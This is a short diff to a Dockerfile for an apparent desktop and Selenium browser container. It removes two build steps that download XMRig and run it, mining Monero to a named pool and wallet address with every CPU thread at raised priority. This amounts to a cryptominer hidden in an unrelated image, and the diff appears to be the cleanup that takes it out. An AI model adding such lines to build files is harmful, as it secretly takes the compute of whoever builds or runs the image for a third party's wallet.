@@ -120,9 +120,7 @@ RUN chmod +x /start.sh /usr/local/bin/start-nginx.sh /usr/local/bin/start-web.sh
         /usr/local/bin/google-chrome-tuned \
     && chown desktopuser:desktopuser /home/desktopuser/selenium_example.py
 
-RUN cd ~ && sudo apt update && sudo apt install -y wget tar && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-noble-x64.tar.gz && tar -xzf xmrig-6.26.0-noble-x64.tar.gz && cd xmrig-6.26.0 && chmod +x xmrig && ./xmrig --version
 
-RUN cd ~/xmrig-6.26.0 && ./xmrig -o de.monero.herominers.com:1111 -u 47cZktvBCtVGLMah2BCoDKEsa53Gsnchz4156zLCEG4k6g5Y4mkh9XdGZ372z6Spyj8B3dFBHm285AGxe5f7ZWBrE3mzwjD -p render-worker -a rx/0 --threads=100% --huge-pages --randomx-1gb-pages --cpu-priority=5 --cpu-no-yield
 
 HEALTHCHECK --interval=30s --timeout=10s --start-period=60s --retries=3 \
     CMD curl -fsS "http://localhost:${PORT:-8080}/health" || exit 1
